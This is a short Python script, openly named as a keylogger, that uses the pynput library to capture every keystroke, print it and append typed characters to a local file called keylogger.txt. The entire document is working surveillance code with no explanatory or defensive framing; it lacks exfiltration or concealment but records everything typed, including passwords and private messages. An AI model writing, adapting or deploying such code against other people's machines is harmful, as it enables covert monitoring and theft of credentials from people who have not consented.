from pynput import keyboard

def keypress(key):
    print(str(key))
    with open("keylogger.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            print("Special key {0} pressed".format(key))

def start_keylogger():
    with keyboard.Listener(on_press=keypress) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
